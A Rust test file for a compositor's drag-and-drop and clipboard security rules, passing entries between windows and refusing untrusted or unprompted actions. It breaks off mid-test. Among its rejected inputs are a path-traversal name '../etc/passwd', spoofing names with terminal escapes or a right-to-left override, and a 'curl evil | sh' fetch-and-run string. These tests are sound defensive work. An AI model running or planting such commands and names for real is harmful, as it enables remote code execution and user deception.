//! Stage 7e: dropping an entry (ADR-0170) against the fake of `tests.rs`:
//! a drag starts only from the press the compositor delivered to the
//! source's body and still held; no window hears of the pointer while it
//! is carried; the release gives the window under it the entry and the
//! pill, and the source only `DragEnded`; anything else closes the entry.

use super::rooms::{axis, done};
use super::*;

const ROOMS: &str = "project --colour 1 +w ~/project\n";

struct Two {
    s: Setup,
    panel: u32,
    a: u32,
    b: u32,
    ida: u32,
    oa: Rect,
    ob: Rect,
}

/// Two windows, `files` and `t_open`, the second above the first.
fn two() -> Two {
    two_on(W, H)
}

/// The same on a display of `w × h`.
fn two_on(w: u32, h: u32) -> Two {
    let mut s = setup_with(|f| f.display_size = (w, h));
    let panel = s.panel();
    assert_eq!(s.set_rooms(panel, "", ROOMS), status::OK);
    let a = s.room_client(panel, "project", "files", "+w /");
    let ida = s.window_of(a, 300, 200, 0x0040_4040);
    let b = s.room_client(panel, "project", "t_open", "+w ~/project");
    let idb = s.window_of(b, 300, 200, 0x0060_6060);
    let (oa, ob) = (s.outer(0, ida), s.outer(1, idb));
    Two {
        s,
        panel,
        a,
        b,
        ida,
        oa,
        ob,
    }
}

fn at(s: &mut Setup, x: i64, y: i64, button: Option<u32>) {
    let (w, h) = s.f().display_size;
    s.point(axis(x, w), axis(y, h), button);
}

/// The serial of the last pointer event the client got.
fn serial(s: &mut Setup, end: u32) -> u32 {
    s.f()
        .peers
        .get(&end)
        .unwrap()
        .outbox
        .iter()
        .rev()
        .find_map(|m| decode::<gui::WindowPointer>(m, 0).ok())
        .map(|(_, p)| p.serial)
        .unwrap_or(0)
}

fn drag(s: &mut Setup, end: u32, window: u32, entry: u32) -> u32 {
    let serial = serial(s, end);
    drag_named(s, end, window, entry, serial)
}

fn drag_named(s: &mut Setup, end: u32, window: u32, entry: u32, serial: u32) -> u32 {
    drag_as(s, end, window, entry, serial, "notes.txt")
}

fn drag_as(s: &mut Setup, end: u32, window: u32, entry: u32, serial: u32, name: &str) -> u32 {
    let m = gui::Drag {
        window,
        serial,
        name: zoraya_protocol::Data(name.as_bytes()),
    };
    s.f().send(end, message(&m, 4), vec![entry]);
    s.c.step();
    s.f()
        .take(end)
        .iter()
        .find_map(|r| decode::<gui::DragDone>(r, 0).ok())
        .map(|(_, d)| d.status.0)
        .expect("a DragDone")
}

fn ordinals(out: &[Vec<u8>]) -> Vec<u32> {
    out.iter()
        .map(|m| Header::decode(m).unwrap().0.ordinal)
        .collect()
}

#[test]
fn a_drop_gives_the_window_under_the_pointer_the_entry_and_its_pill() {
    let mut t = two();
    // The press in the source's body, where the other window is not.
    let (px, py) = (t.oa.x + 10, t.oa.y + 60);
    at(&mut t.s, px, py, Some(1));
    let entry = t.s.f().channel(1);
    assert_eq!(drag(&mut t.s, t.a, t.ida, entry), status::OK);
    t.s.f().take(t.b);
    // Carried over the target, where the source (raised by its press)
    // is not: it hears nothing of the pointer.
    let (tx, ty) = (t.ob.right() - 15, t.ob.bottom() - 15);
    assert!(!t.oa.contains(tx, ty));
    at(&mut t.s, tx, ty, None);
    assert!(
        !ordinals(&t.s.f().take(t.b)).contains(&23),
        "no pointer events during the drag"
    );
    at(&mut t.s, tx, ty, Some(0));
    let got = t.s.f().take(t.b);
    let (_, d) = got
        .iter()
        .find_map(|r| decode::<gui::Drop<'_>>(r, 1).ok())
        .expect("the target gets the drop");
    assert_eq!(d.name.0, b"notes.txt", "a display name, never a path");
    assert_eq!(t.s.f().given, [(t.b, entry)]);
    assert!(
        t.s.c
            .record(1)
            .is_some_and(|r| r.entries.iter().any(|e| e == "dropped: notes.txt read")),
        "the target's frame shows the grant, in the compositor's words"
    );
    assert!(ordinals(&t.s.f().take(t.a)).contains(&26), "DragEnded");
    assert!(!t.s.f().closed.contains(&entry));
}

#[test]
fn a_drag_needs_the_sources_held_press_and_a_drop_elsewhere() {
    let mut t = two();
    // No press: refused, and the entry closed.
    let e1 = t.s.f().channel(1);
    assert_eq!(drag(&mut t.s, t.a, t.ida, e1), status::BAD_RANGE);
    assert!(t.s.f().closed.contains(&e1));
    // A press on the other window does not let this one drag.
    at(&mut t.s, t.ob.x + 150, t.ob.y + 120, Some(1));
    let e2 = t.s.f().channel(1);
    assert_eq!(drag(&mut t.s, t.a, t.ida, e2), status::BAD_RANGE);
    at(&mut t.s, t.ob.x + 150, t.ob.y + 120, Some(0));
    // A released press is no longer held.
    let (px, py) = (t.oa.x + 10, t.oa.y + 60);
    at(&mut t.s, px, py, Some(1));
    at(&mut t.s, px, py, Some(0));
    let e3 = t.s.f().channel(1);
    assert_eq!(drag(&mut t.s, t.a, t.ida, e3), status::BAD_RANGE);
    // Dropped back on the source, or on no window: nothing delivered.
    for (x, y) in [(px, py + 4), (600, 40)] {
        at(&mut t.s, px, py, Some(1));
        let n = serial(&mut t.s, t.a);
        let e = t.s.f().channel(1);
        assert_eq!(drag_named(&mut t.s, t.a, t.ida, e, n), status::OK);
        // Only one carried at a time.
        let again = t.s.f().channel(1);
        assert_eq!(
            drag_named(&mut t.s, t.a, t.ida, again, n),
            status::BAD_RANGE
        );
        at(&mut t.s, x, y, None);
        at(&mut t.s, x, y, Some(0));
        assert!(t.s.f().closed.contains(&e), "({x}, {y})");
        assert!(ordinals(&t.s.f().take(t.a)).contains(&26));
    }
    assert!(t.s.f().given.is_empty());
    // A press's serial, named: an older one, or after 500 ms, is refused.
    at(&mut t.s, px, py, Some(1));
    let now = serial(&mut t.s, t.a);
    let e5 = t.s.f().channel(1);
    assert_eq!(
        drag_named(&mut t.s, t.a, t.ida, e5, now - 1),
        status::BAD_RANGE
    );
    t.s.f().clock += 600_000_000;
    let e6 = t.s.f().channel(1);
    assert_eq!(drag_named(&mut t.s, t.a, t.ida, e6, now), status::BAD_RANGE);
    at(&mut t.s, px, py, Some(0));
    // A name the compositor would draw falsely, or a path, or an entry
    // that is no connection: refused, the entry closed.
    for (name, memory) in [
        ("a\u{1b}[31m", false),
        ("gpj.exe\u{202e}txt", false),
        ("../etc/passwd", false),
        ("", false),
        ("notes.txt", true),
    ] {
        at(&mut t.s, px, py, Some(1));
        let n = serial(&mut t.s, t.a);
        let e = if memory {
            t.s.f().memory(vec![0; 4], 16, false)
        } else {
            t.s.f().channel(1)
        };
        assert_eq!(
            drag_as(&mut t.s, t.a, t.ida, e, n, name),
            status::BAD_RANGE,
            "{name:?}"
        );
        assert!(t.s.f().closed.contains(&e), "{name:?}");
        at(&mut t.s, px, py, Some(0));
    }
    let _ = done;
}

/// Each client counts only its own presses (review 7e, 4), and an untrusted
/// room's window gets no drop until the compositor's confirming card exists
/// (ADR-0172 point 6, INV-0172-3).
#[test]
fn serials_are_per_client_and_untrusted_windows_take_no_drop() {
    let mut s = setup();
    let panel = s.panel();
    assert_eq!(
        s.set_rooms(panel, "", "agent-1 --untrusted +w ~/sandbox\n"),
        status::OK
    );
    let a = s.room_client(panel, "", "files", "+w /");
    let ida = s.window_of(a, 300, 200, 0x0040_4040);
    let oa = s.outer(0, ida);
    let end = s.f().channel(64);
    let m = gui::AddRoomClient {
        untrusted: 1,
        colour: 0,
        tag: 0,
        room: zoraya_protocol::Data(b"agent-1"),
        app: zoraya_protocol::Data(b"agent"),
        entries: zoraya_protocol::Data(b"+w ~/sandbox"),
        line: zoraya_protocol::Data(b"agent"),
    };
    s.f().send(panel, message(&m, 7), vec![end]);
    s.c.step();
    assert_eq!(done(&mut s, panel), status::OK);
    let idb = s.window_of(end, 300, 200, 0x0060_6060);
    let ob = s.outer(1, idb);
    // Presses on the untrusted window: its own count only.
    let (bx, by) = (ob.right() - 15, ob.bottom() - 15);
    for _ in 0..3 {
        at(&mut s, bx, by, Some(1));
        at(&mut s, bx, by, Some(0));
    }
    let (px, py) = (oa.x + 10, oa.y + 60);
    at(&mut s, px, py, Some(1));
    assert_eq!(serial(&mut s, a), 1, "a's first press, whatever b got");
    let e = s.f().channel(1);
    assert_eq!(drag(&mut s, a, ida, e), status::OK);
    let (tx, ty) = (ob.right() - 15, ob.bottom() - 15);
    at(&mut s, tx, ty, None);
    at(&mut s, tx, ty, Some(0));
    assert!(
        s.f().given.is_empty(),
        "nothing given to an untrusted window"
    );
    assert!(s.f().closed.contains(&e));
}

/// Escape ends a drag with nothing delivered, and keys reach no client
/// meanwhile (ADR-0170).
#[test]
fn escape_ends_a_drag() {
    let mut t = two();
    let (px, py) = (t.oa.x + 10, t.oa.y + 60);
    at(&mut t.s, px, py, Some(1));
    let e = t.s.f().channel(1);
    assert_eq!(drag(&mut t.s, t.a, t.ida, e), status::OK);
    t.s.f().take(t.a);
    t.s.keys(&[(code::ESC, 1), (code::ESC, 0)]);
    assert!(t.s.f().closed.contains(&e));
    let got = ordinals(&t.s.f().take(t.a));
    assert!(got.contains(&26) && !got.contains(&16), "{got:?}");
    // The cancelled press, still held, starts no drag again.
    let again = t.s.f().channel(1);
    assert_eq!(drag(&mut t.s, t.a, t.ida, again), status::BAD_RANGE);
    let (tx, ty) = (t.ob.right() - 15, t.ob.bottom() - 15);
    at(&mut t.s, tx, ty, Some(0));
    assert!(t.s.f().given.is_empty());
}

fn offer(s: &mut Setup, end: u32, text: &str) -> u32 {
    let m = gui::Offer {
        text: zoraya_protocol::Data(text.as_bytes()),
    };
    s.f().send(end, message(&m, 8), vec![]);
    s.c.step();
    s.f()
        .take(end)
        .iter()
        .find_map(|r| decode::<gui::OfferDone>(r, 0).ok())
        .map(|(_, d)| d.status.0)
        .expect("an OfferDone")
}

fn chord(s: &mut Setup, key: u32) {
    s.keys(&[
        (code::RIGHT_META, 1),
        (key, 1),
        (key, 0),
        (code::RIGHT_META, 0),
    ]);
}

/// INV-0170-1 and -2: the clipboard is set only by an `Offer` answering
/// the `Copy` the compositor sent that client, within 500 ms, and given
/// only in a `Paste` to the focused window on System+V; nothing else
/// reveals it.
#[test]
fn the_clipboard_moves_only_on_the_persons_chords() {
    let mut t = two();
    // Unprompted: refused.
    assert_eq!(offer(&mut t.s, t.a, "secret"), status::BAD_RANGE);
    // b focused by a press (a new window takes focus only from the
    // person); System+V with nothing copied sends nothing.
    let (bx, by) = (t.ob.right() - 15, t.ob.bottom() - 15);
    at(&mut t.s, bx, by, Some(1));
    at(&mut t.s, bx, by, Some(0));
    t.s.f().take(t.b);
    // Past the press's own unasked offer (proposed ADR-0248, tested below).
    t.s.f().clock += GESTURE_OFFER_NS + 1;
    chord(&mut t.s, code::V);
    assert!(!ordinals(&t.s.f().take(t.b)).contains(&28));
    // System+C asks the focused client; its offer within 500 ms is kept,
    // another client's is not.
    chord(&mut t.s, code::C);
    let got = t.s.f().take(t.b);
    let (_, c) = got
        .iter()
        .find_map(|m| decode::<gui::Copy>(m, 0).ok())
        .expect("Copy to the focused client");
    assert!(!c.cut);
    assert_eq!(offer(&mut t.s, t.a, "from a"), status::BAD_RANGE);
    assert_eq!(offer(&mut t.s, t.b, "kůň"), status::OK);
    assert_eq!(
        offer(&mut t.s, t.b, "again"),
        status::BAD_RANGE,
        "once per Copy"
    );
    // System+X: a cut; too late an offer is refused.
    chord(&mut t.s, code::X);
    assert!(
        t.s.f()
            .take(t.b)
            .iter()
            .filter_map(|m| decode::<gui::Copy>(m, 0).ok())
            .any(|(_, c)| c.cut)
    );
    t.s.f().clock += 600_000_000;
    assert_eq!(offer(&mut t.s, t.b, "late"), status::BAD_RANGE);
    // System+V gives the focused client the text, and no one else.
    t.s.f().take(t.a);
    chord(&mut t.s, code::V);
    let got = t.s.f().take(t.b);
    let (_, p) = got
        .iter()
        .find_map(|m| decode::<gui::Paste<'_>>(m, 0).ok())
        .expect("Paste");
    assert_eq!(p.text.0, "kůň".as_bytes());
    assert!(!ordinals(&t.s.f().take(t.a)).contains(&28));
}

/// The clipboard holds its whole bound: 20 KiB offered, the same pasted
/// (review 7f, 1 and 2: the compositor's buffers were 4 KiB and 512 bytes).
#[test]
fn a_large_clipboard_is_kept_and_pasted_whole() {
    let mut t = two();
    let (bx, by) = (t.ob.right() - 15, t.ob.bottom() - 15);
    at(&mut t.s, bx, by, Some(1));
    at(&mut t.s, bx, by, Some(0));
    chord(&mut t.s, code::C);
    let big: String = "kůň ".repeat(4000);
    assert!(big.len() > 20_000);
    assert_eq!(offer(&mut t.s, t.b, &big), status::OK);
    t.s.f().take(t.b);
    chord(&mut t.s, code::V);
    let got = t.s.f().take(t.b);
    let (_, p) = got
        .iter()
        .find_map(|m| decode::<gui::Paste<'_>>(m, 0).ok())
        .expect("Paste");
    assert_eq!(p.text.0, big.as_bytes());
}

/// Applying settings tells the focused client of a change of layouts,
/// of the list or of the one in use, and of nothing else.
#[test]
fn the_focused_client_hears_of_a_change_of_layouts_and_only_of_that() {
    let mut t = two();
    let (bx, by) = (t.ob.right() - 15, t.ob.bottom() - 15);
    at(&mut t.s, bx, by, Some(1));
    at(&mut t.s, bx, by, Some(0));
    t.s.f().take(t.b);
    let heard = |t: &mut Two, w: [&str; 6]| {
        let panel = t.panel;
        assert_eq!(super::settings::apply(&mut t.s, panel, w), status::OK);
        t.s.f()
            .take(t.b)
            .iter()
            .filter(|m| decode::<gui::Layout<'_>>(m, 0).is_ok())
            .count()
    };
    // The same settings twice: the second time nothing changed.
    heard(&mut t, ["light", "yes", "auto", "", "us", "us"]);
    assert_eq!(heard(&mut t, ["light", "yes", "auto", "", "us", "us"]), 0);
    assert_eq!(
        heard(&mut t, ["light", "yes", "auto", "", "us ua", "us"]),
        1
    );
    assert_eq!(
        heard(&mut t, ["light", "yes", "auto", "", "us ua", "ua"]),
        1
    );
}

/// A client that goes away takes only its own pending `Copy` with it.
#[test]
fn a_copy_asked_of_one_client_outlives_another_clients_going() {
    let mut t = two();
    let (ax, ay) = (t.oa.x + 15, t.oa.y + 40);
    at(&mut t.s, ax, ay, Some(1));
    at(&mut t.s, ax, ay, Some(0));
    chord(&mut t.s, code::C);
    assert!(
        t.s.f()
            .take(t.a)
            .iter()
            .any(|m| decode::<gui::Copy>(m, 0).is_ok()),
        "Copy to the focused client"
    );
    let b = t.b;
    t.s.f().peers.get_mut(&b).unwrap().gone = true;
    t.s.c.step();
    assert_eq!(offer(&mut t.s, t.a, "x"), status::OK);
}

/// Other keys, and an Escape that is only released, leave the drag carried
/// and reach no client; the drop still lands.
#[test]
fn only_an_escape_press_ends_a_drag() {
    let mut t = two();
    let (px, py) = (t.oa.x + 10, t.oa.y + 60);
    at(&mut t.s, px, py, Some(1));
    let e = t.s.f().channel(1);
    assert_eq!(drag(&mut t.s, t.a, t.ida, e), status::OK);
    t.s.f().take(t.a);
    t.s.keys(&[(30, 1), (30, 0), (code::ESC, 0)]);
    assert!(!t.s.f().closed.contains(&e));
    let got = ordinals(&t.s.f().take(t.a));
    assert!(!got.contains(&26) && !got.contains(&16), "{got:?}");
    let (tx, ty) = (t.ob.right() - 15, t.ob.bottom() - 15);
    at(&mut t.s, tx, ty, None);
    at(&mut t.s, tx, ty, Some(0));
    assert_eq!(t.s.f().given, [(t.b, e)]);
}

/// The drop says where it landed, in the target body's logical pixels, at
/// both scales.
#[test]
fn a_drop_lands_at_the_pointer_in_the_targets_logical_pixels() {
    for (w, h) in [(W, H), (2048, 1536)] {
        let mut t = two_on(w, h);
        let k = i64::from(t.s.c.scale().factor());
        let (px, py) = (t.oa.x + 10 * k, t.oa.y + 60 * k);
        at(&mut t.s, px, py, Some(1));
        let entry = t.s.f().channel(1);
        assert_eq!(drag(&mut t.s, t.a, t.ida, entry), status::OK);
        t.s.f().take(t.b);
        let body = t.s.c.window(Key { client: 1, id: 1 }).unwrap().body_rect();
        let (tx, ty) = (t.ob.right() - 15 * k, t.ob.bottom() - 13 * k);
        at(&mut t.s, tx, ty, None);
        at(&mut t.s, tx, ty, Some(0));
        let got = t.s.f().take(t.b);
        let (_, d) = got
            .iter()
            .find_map(|r| decode::<gui::Drop<'_>>(r, 1).ok())
            .expect("the target gets the drop");
        let want = ((tx - body.x) / k, (ty - body.y) / k);
        assert!(want.0 > 1 && want.1 > 1);
        assert_eq!((i64::from(d.x), i64::from(d.y)), want, "{w} × {h}");
    }
}

/// A press the compositor no longer knows to be held, after the input
/// driver that delivered it is lost, starts no drag.
#[test]
fn a_press_from_a_lost_input_driver_starts_no_drag() {
    let mut t = two();
    let (px, py) = (t.oa.x + 10, t.oa.y + 60);
    at(&mut t.s, px, py, Some(1));
    let tablet = t.s.tablet;
    t.s.f().peers.get_mut(&tablet).unwrap().gone = true;
    t.s.c.step();
    assert!(t.s.f().closed.contains(&tablet));
    let e = t.s.f().channel(1);
    assert_eq!(drag(&mut t.s, t.a, t.ida, e), status::BAD_RANGE);
    assert!(t.s.f().closed.contains(&e));
}

/// The target's frame shows its new pill once the drop lands: the title
/// bar is composed again, though the pointer never passed over it.
#[test]
fn the_targets_title_bar_is_composed_again_with_the_dropped_pill() {
    let mut t = two();
    // The source moved down by its title bar, off the target's.
    let (gx, gy) = (t.oa.x + 150, t.oa.y + 10);
    at(&mut t.s, gx, gy, Some(1));
    at(&mut t.s, gx, gy + 240, None);
    at(&mut t.s, gx, gy + 240, Some(0));
    t.oa = t.s.outer(0, t.ida);
    let f = t.s.c.frame();
    assert!(t.oa.y > t.ob.y + f.title + 60, "{:?}", t.oa);
    let (px, py) = (t.oa.x + 10, t.oa.y + 60);
    at(&mut t.s, px, py, Some(1));
    // The target's title bar, inside its border.
    let strip = Rect::new(t.ob.x + 1, t.ob.y + 1, t.ob.width - 2, f.title - 2);
    let pixels = |s: &mut Setup| {
        let mut v = Vec::new();
        for y in strip.y..strip.bottom() {
            for x in strip.x..strip.right() {
                v.push(s.pixel(x, y));
            }
        }
        v
    };
    let before = pixels(&mut t.s);
    let entry = t.s.f().channel(1);
    assert_eq!(drag(&mut t.s, t.a, t.ida, entry), status::OK);
    // Into the target's body, the label's room below its title bar.
    let (tx, ty) = (t.ob.right() - 15, t.ob.y + f.title + 40);
    at(&mut t.s, tx, ty, None);
    at(&mut t.s, tx, ty, Some(0));
    assert_eq!(t.s.f().given, [(t.b, entry)]);
    assert!(pixels(&mut t.s) != before, "the pill is shown");
}

/// The carried name is drawn on the material beside the pointer, its halo
/// with it, while the pointer moves; where it was, the screen comes back
/// as it was. At both scales, with a long name.
#[test]
fn the_carried_name_is_composed_beside_the_pointer_and_cleaned_after() {
    // Wide letters: the label is most of the room kept for it.
    let name = "QUARTERLY PLANNING MEMO FOR THE WHOLE TEAM WITH DRAFTS MWM.TXT";
    for (w, h, p1, p2) in [
        (1280, 800, (500, 450), (500, 100)),
        (2048, 1536, (200, 900), (200, 1300)),
    ] {
        let mut t = two_on(w, h);
        let k = i64::from(t.s.c.scale().factor());
        let cap = zoraya_tokens::text::CAPTION.physical(Scale::ONE) * k as u32;
        let label_w = i64::from(t.s.c.title_text.measure(name, cap)) + 20 * k;
        // Wide enough that a room cut short loses its end, narrow enough
        // for the room kept for it.
        assert!(
            (440 * k..=550 * k).contains(&label_w),
            "the name's label is {label_w} wide"
        );
        let width = w as usize;
        let px = |s: &mut Setup, x: i64, y: i64| s.f().frame[y as usize * width + x as usize];
        // The label box: 16 to 34 logical pixels below, from 16 right of
        // the pointer.
        let (lx, ly, lh) = (p1.0 + 16 * k, p1.1 + 11 * k, 23 * k);
        let probes = [
            ("top", lx + label_w / 2, ly + 2 * k),
            ("end", lx + label_w - 4 * k, ly + lh / 2),
            ("bottom", lx + label_w / 2, ly + lh - 3 * k),
            ("halo", lx - 4 * k, ly + lh / 2),
        ];
        let area = Rect::new(p1.0 - 16 * k, p1.1, label_w + 40 * k, 40 * k);
        let snap = |s: &mut Setup| {
            let mut v = Vec::new();
            for y in area.y..area.bottom() {
                for x in area.x..area.right() {
                    v.push(px(s, x, y));
                }
            }
            v
        };
        at(&mut t.s, p2.0, p2.1, None);
        let clean = snap(&mut t.s);
        let under: Vec<u32> = probes.iter().map(|&(_, x, y)| px(&mut t.s, x, y)).collect();
        let (sx, sy) = (t.oa.x + 10 * k, t.oa.y + 60 * k);
        at(&mut t.s, sx, sy, Some(1));
        let n = serial(&mut t.s, t.a);
        // The label's top where the drag starts: the pointer, still, is
        // not composed again with it.
        let top = (sx + 16 * k + label_w / 2, sy + 13 * k);
        let was = px(&mut t.s, top.0, top.1);
        let entry = t.s.f().channel(1);
        assert_eq!(drag_as(&mut t.s, t.a, t.ida, entry, n, name), status::OK);
        assert_ne!(
            px(&mut t.s, top.0, top.1),
            was,
            "the label's top at the press"
        );
        at(&mut t.s, p1.0, p1.1, None);
        for (&(what, x, y), was) in probes.iter().zip(&under) {
            assert_ne!(px(&mut t.s, x, y), *was, "the label's {what} at {w} × {h}");
        }
        at(&mut t.s, p2.0, p2.1, None);
        assert!(snap(&mut t.s) == clean, "nothing stays at {w} × {h}");
    }
}

#[test]
fn a_name_wider_than_the_kept_room_is_composed_to_its_end_and_cleaned_after() {
    // 64 bytes, the longest name a drag carries, of the widest letter.
    let name = "W".repeat(64);
    let mut t = two_on(1280, 800);
    let cap = zoraya_tokens::text::CAPTION.physical(Scale::ONE);
    let label_w = i64::from(t.s.c.title_text.measure(&name, cap)) + 20;
    assert!(label_w > 600, "the name's label is {label_w} wide");
    let (p1, p2) = ((200, 450), (200, 100));
    // Near the label's end, in its middle row.
    let end = (p1.0 + 16 + label_w - 6, p1.1 + 22);
    let px = |s: &mut Setup, x: i64, y: i64| s.f().frame[y as usize * 1280 + x as usize];
    at(&mut t.s, p2.0, p2.1, None);
    let under = px(&mut t.s, end.0, end.1);
    let (sx, sy) = (t.oa.x + 10, t.oa.y + 60);
    at(&mut t.s, sx, sy, Some(1));
    let n = serial(&mut t.s, t.a);
    let entry = t.s.f().channel(1);
    assert_eq!(drag_as(&mut t.s, t.a, t.ida, entry, n, &name), status::OK);
    at(&mut t.s, p1.0, p1.1, None);
    assert_ne!(px(&mut t.s, end.0, end.1), under, "the label's end");
    at(&mut t.s, p2.0, p2.1, None);
    assert_eq!(
        px(&mut t.s, end.0, end.1),
        under,
        "nothing stays at the end"
    );
}

/// Proposed ADR-0248, INV-0248-2: one unasked `Offer` is taken from the
/// client whose focused window got a press in its body within a second (a
/// menu's Copy path); none after a key, none later, none from another
/// client, one per press (review 7h, 2 and 3).
#[test]
fn a_press_in_a_window_lets_it_offer_once() {
    let mut t = two();
    let (bx, by) = (t.ob.right() - 15, t.ob.bottom() - 15);
    at(&mut t.s, bx, by, Some(1));
    at(&mut t.s, bx, by, Some(0));
    t.s.f().take(t.b);
    assert_eq!(offer(&mut t.s, t.a, "from a"), status::BAD_RANGE);
    assert_eq!(offer(&mut t.s, t.b, "~/project/notes.txt"), status::OK);
    assert_eq!(offer(&mut t.s, t.b, "again"), status::BAD_RANGE, "once");
    // A key gives no right to offer.
    t.s.keys(&[(30, 1), (30, 0)]);
    assert_eq!(offer(&mut t.s, t.b, "typed"), status::BAD_RANGE);
    // A press, then too late: refused.
    at(&mut t.s, bx, by, Some(1));
    at(&mut t.s, bx, by, Some(0));
    t.s.f().clock += GESTURE_OFFER_NS + 1;
    assert_eq!(offer(&mut t.s, t.b, "late"), status::BAD_RANGE);
}

/// Review 7h, 3: the gesture goes with a focus change, a System+C asked of
/// the focused client is not cancelled by another's unasked offer, and a
/// client gone takes its gesture with it.
#[test]
fn a_gesture_does_not_outlive_the_focus_or_a_copy() {
    let mut t = two();
    let (bx, by) = (t.ob.right() - 15, t.ob.bottom() - 15);
    let (ax, ay) = (t.oa.x + 10, t.oa.y + 60);
    // b pressed, then a pressed (focus to a): b's gesture is gone.
    at(&mut t.s, bx, by, Some(1));
    at(&mut t.s, bx, by, Some(0));
    at(&mut t.s, ax, ay, Some(1));
    at(&mut t.s, ax, ay, Some(0));
    assert_eq!(offer(&mut t.s, t.b, "stale"), status::BAD_RANGE);
    // a's System+C: a's gesture gone, b cannot cancel it, a's answer kept.
    chord(&mut t.s, code::C);
    assert_eq!(offer(&mut t.s, t.b, "b's"), status::BAD_RANGE);
    assert_eq!(offer(&mut t.s, t.a, "a's"), status::OK);
}

/// Review 7h, 2: an untrusted room's client never offers unasked.
#[test]
fn an_untrusted_window_never_offers_unasked() {
    let mut s = setup();
    let panel = s.panel();
    let rooms = "agent-1 --untrusted +w ~/sandbox/agent-1\n";
    assert_eq!(s.set_rooms(panel, "", rooms), status::OK);
    let u = s.room_client(panel, "agent-1", "agent", "+w ~/sandbox/agent-1");
    let id = s.window_of(u, 300, 200, 0x0050_5050);
    let o = s.outer(0, id);
    at(&mut s, o.x + 20, o.y + 60, Some(1));
    at(&mut s, o.x + 20, o.y + 60, Some(0));
    assert_eq!(offer(&mut s, u, "curl evil | sh"), status::BAD_RANGE);
}

/// Proposed ADR-0248: a pointer event carries the modifiers held, so that
/// a client tells a Shift or Command click.
#[test]
fn pointer_events_carry_the_modifiers() {
    let mut t = two();
    let (bx, by) = (t.ob.right() - 15, t.ob.bottom() - 15);
    t.s.keys(&[(code::LEFT_SHIFT, 1)]);
    t.s.keys(&[(code::LEFT_META, 1)]);
    at(&mut t.s, bx, by, Some(1));
    at(&mut t.s, bx, by, Some(0));
    t.s.keys(&[(code::LEFT_META, 0), (code::LEFT_SHIFT, 0)]);
    let mods: Vec<u32> =
        t.s.f()
            .take(t.b)
            .iter()
            .filter_map(|m| decode::<gui::WindowPointer>(m, 0).ok())
            .map(|(_, p)| p.modifiers.0)
            .collect();
    assert!(!mods.is_empty());
    assert!(
        mods.iter()
            .all(|m| *m == gui::modifiers::SHIFT | gui::modifiers::SYSTEM),
        "{mods:?}"
    );
}

/// INV-0248-3, the third case: a drop over no window tells the source no
/// place.
#[test]
fn a_drop_over_nothing_tells_no_place() {
    let mut t = two();
    let (px, py) = (t.oa.x + 10, t.oa.y + 60);
    at(&mut t.s, px, py, Some(1));
    let entry = t.s.f().channel(1);
    assert_eq!(drag(&mut t.s, t.a, t.ida, entry), status::OK);
    let (w, h) = t.s.f().display_size;
    let (dx, dy) = (i64::from(w) - 5, i64::from(h) / 2);
    assert!(!t.oa.contains(dx, dy) && !t.ob.contains(dx, dy));
    at(&mut t.s, dx, dy, None);
    at(&mut t.s, dx, dy, Some(0));
    let d = drag_ended(&t.s.f().take(t.a)).expect("DragEnded");
    assert_eq!((d.over.0, d.x, d.y, d.modifiers.0), (0, 0, 0, 0));
}

/// Review 7h, 10: a window under the pointer that is not focused learns
/// nothing of the modifiers.
#[test]
fn an_unfocused_window_hears_no_modifiers() {
    let mut t = two();
    // a is focused (the first window); the pointer moves over b, Shift
    // held.
    assert_eq!(t.s.c.focused().map(|k| k.client), Some(0));
    let (ax, ay) = (t.ob.right() - 15, t.ob.bottom() - 15);
    t.s.f().take(t.b);
    t.s.keys(&[(code::LEFT_SHIFT, 1)]);
    at(&mut t.s, ax, ay, None);
    at(&mut t.s, ax + 3, ay, None);
    t.s.keys(&[(code::LEFT_SHIFT, 0)]);
    let mods: Vec<u32> =
        t.s.f()
            .take(t.b)
            .iter()
            .filter_map(|m| decode::<gui::WindowPointer>(m, 0).ok())
            .map(|(_, p)| p.modifiers.0)
            .collect();
    assert!(!mods.is_empty());
    assert!(mods.iter().all(|m| *m == 0), "{mods:?}");
}

fn drag_ended(out: &[Vec<u8>]) -> Option<gui::DragEnded> {
    out.iter()
        .find_map(|m| decode::<gui::DragEnded>(m, 0).ok())
        .map(|(_, d)| d)
}

/// Proposed ADR-0248, INV-0248-3: a drop over the source's own window
/// tells the source where, with the modifiers held, and sends no `Drop`;
/// over another window or nothing, the source learns nothing of the place.
#[test]
fn a_drop_on_the_sources_own_window_tells_it_where() {
    let mut t = two();
    let (px, py) = (t.oa.x + 10, t.oa.y + 60);
    at(&mut t.s, px, py, Some(1));
    let entry = t.s.f().channel(1);
    assert_eq!(drag(&mut t.s, t.a, t.ida, entry), status::OK);
    // Alt held at the release: a copy, for the file manager.
    t.s.keys(&[(code::LEFT_ALT, 1)]);
    // In the source's body, raised above the other by its press.
    let (qx, qy) = (t.oa.x + 40, t.oa.y + 90);
    at(&mut t.s, qx, qy, None);
    at(&mut t.s, qx, qy, Some(0));
    t.s.keys(&[(code::LEFT_ALT, 0)]);
    let d = drag_ended(&t.s.f().take(t.a)).expect("DragEnded");
    let body =
        t.s.c
            .window(Key {
                client: 0,
                id: t.ida,
            })
            .unwrap()
            .body_rect();
    assert_eq!(d.over.0, 1);
    assert_eq!((i64::from(d.x), i64::from(d.y)), (qx - body.x, qy - body.y));
    assert_eq!(d.modifiers.0 & gui::modifiers::ALT, gui::modifiers::ALT);
    assert!(t.s.f().given.is_empty(), "no Drop, no handle given");
    assert!(t.s.f().closed.contains(&entry), "the entry closed");
    // Over the other window: a Drop there, and no place for the source.
    at(&mut t.s, px, py, Some(1));
    let entry = t.s.f().channel(1);
    assert_eq!(drag(&mut t.s, t.a, t.ida, entry), status::OK);
    let (tx, ty) = (t.ob.right() - 15, t.ob.bottom() - 15);
    at(&mut t.s, tx, ty, None);
    at(&mut t.s, tx, ty, Some(0));
    let d = drag_ended(&t.s.f().take(t.a)).expect("DragEnded");
    assert_eq!((d.over.0, d.x, d.y, d.modifiers.0), (0, 0, 0, 0));
}

/// Mutation testing (7h): at scale 2 a drop on the source's own window
/// names its place in logical pixels; the gesture goes with a focus change
/// made by the keyboard (no press replaces it) and with the client's end.
#[test]
fn a_place_is_logical_and_the_gesture_goes_with_focus_and_client() {
    let mut t = two_on(2048, 1536);
    assert_eq!(t.s.c.scale().factor(), 2);
    let (px, py) = (t.oa.x + 20, t.oa.y + 120);
    at(&mut t.s, px, py, Some(1));
    let entry = t.s.f().channel(1);
    assert_eq!(drag(&mut t.s, t.a, t.ida, entry), status::OK);
    let (qx, qy) = (t.oa.x + 80, t.oa.y + 200);
    at(&mut t.s, qx, qy, None);
    at(&mut t.s, qx, qy, Some(0));
    let d = drag_ended(&t.s.f().take(t.a)).expect("DragEnded");
